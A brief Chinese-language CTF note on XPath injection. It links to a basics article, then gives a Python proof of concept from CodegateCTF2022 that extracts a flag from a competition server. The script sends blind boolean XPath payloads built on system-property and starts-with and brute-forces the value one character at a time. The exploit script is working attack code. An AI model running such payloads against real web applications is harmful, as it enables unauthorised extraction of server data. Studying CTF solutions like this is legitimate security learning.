# XPath注入

## 基础部分

可以简单看看先知上的这篇文章：https://xz.aliyun.com/t/7791

## 其他

### CodegateCTF2022

本周末打了一下这个比赛，猜到了读系统配置，奈何太菜了最后没做出来

poc

```python
import requests
from string import ascii_lowercase, digits

SESSION = {'JSESSIONID':'5D31583806832F60CE7133EEEA94EA6E'}
flag = ''

for i in range(34+len('codegate2022')):
    for x in ascii_lowercase+digits+'{}':
        conn = requests.get('http://42.192.137.212:1233/blog/read?idx=1%27%20and%20starts-with(system-property(%27flag%27),%27'+flag+x+'%27)%20and%271%27=%271', cookies=SESSION)
        r1 = conn.text
        if 'test' in r1:
            flag += x
            print(flag)
            break
```

